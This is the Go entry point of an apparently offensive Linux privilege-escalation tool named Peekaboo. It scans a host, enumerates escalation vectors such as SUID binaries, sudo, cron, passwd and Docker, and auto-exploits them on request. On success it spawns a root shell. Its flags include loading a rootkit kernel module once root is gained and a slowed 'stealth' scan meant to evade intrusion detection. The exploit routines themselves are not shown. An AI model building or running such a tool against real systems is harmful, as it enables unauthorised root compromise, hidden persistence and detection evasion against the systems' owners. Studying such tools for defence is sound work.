package main

import (
	"flag"
	"fmt"
	"os"
	"sort"
)

func main() {
	opts := parseFlags()

	p := &Peekaboo{Opts: opts}

	printBanner()

	fmt.Printf("  UID: %-10s  PID: %-8d  Host: %s\n\n",
		amIRoot(), os.Getpid(), hostname())

	// FASE 1: Scan
	if !opts.Quiet && !opts.JSON {
		fmt.Println(colorize("  [1/3] Scanning system...", AnsiCyan))
	}
	scanAll(p)

	// FASE 2: Enum
	if !opts.Quiet && !opts.JSON {
		fmt.Println(colorize("\n  [2/3] Enumerating vectors...", AnsiCyan))
	}

	if opts.Vector != "" {
		enumerateVector(p, opts.Vector)
	} else {
		enumerateAll(p)
	}

	// Print findings
	if !opts.JSON && !opts.Quiet {
		fmt.Println(colorize("\n  ── Findings ──", AnsiCyan))
		for _, f := range p.Findings {
			if f.Exploitable {
				p.Print(f)
			}
		}
	}

	// FASE 3: Exploit
	if opts.Exploit {
		if !opts.Quiet && !opts.JSON {
			fmt.Println(colorize("\n  [3/3] Exploiting... (max risk: "+opts.MaxRisk.String()+")", AnsiCyan))
		}

		exploitAll(p)

		if p.Rooted {
			if !opts.JSON {
				if !opts.Quiet {
					fmt.Println(colorize("  [+] Root shell starting...\n", AnsiGreen))
				}
				if opts.Rooteame != "" {
					tryRooteame(p)
				}
				spawnShell()
			}
			if opts.JSON {
				p.ExportJSON()
			}
			os.Exit(0)
		}
	}

	// No root
	if !opts.Quiet && !opts.JSON {
		fmt.Println(colorize("\n  [*] No root obtained. Top vectors:", AnsiYellow))
		printTopVectors(p, 5)
	}

	if opts.JSON {
		p.ExportJSON()
	}

	if opts.Quiet {
		if p.Rooted {
			os.Exit(0)
		}
		os.Exit(1)
	}
}

func parseFlags() Options {
	var opts Options
	var risk string

	flag.BoolVar(&opts.Exploit, "exploit", false, "Auto-exploit found vectors")
	flag.StringVar(&risk, "risk", "safe", "Max risk: safe, low, medium, high, danger")
	flag.StringVar(&opts.Vector, "vector", "", "Specific vector (suid,sudo,cron,passwd,docker)")
	flag.BoolVar(&opts.JSON, "json", false, "JSON output")
	flag.BoolVar(&opts.Quiet, "quiet", false, "Quiet mode (exit code only)")
	flag.StringVar(&opts.Rooteame, "rooteame", "", "Path to rootkit.ko to load on root")
	flag.BoolVar(&opts.Stealth, "stealth", false, "Slow scan to evade IDS")
	flag.BoolVar(&opts.OneShot, "one-shot", false, "Stop after first successful exploit")

	flag.Parse()

	opts.MaxRisk = parseMaxRisk(risk)
	if opts.Quiet {
		opts.Exploit = true
	}
	return opts
}

func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}

func printTopVectors(p *Peekaboo, n int) {
	exploitable := make([]Vector, 0)
	for _, v := range p.Vectors {
		exploitable = append(exploitable, v)
	}
	sort.Slice(exploitable, func(i, j int) bool {
		return exploitable[i].Risk < exploitable[j].Risk
	})
	count := 0
	for _, v := range exploitable {
		if count >= n {
			break
		}
		p.PrintVector(v)
		count++
	}
	if len(exploitable) == 0 {
		fmt.Println(colorize("    (none found)", AnsiGrey))
	}
}
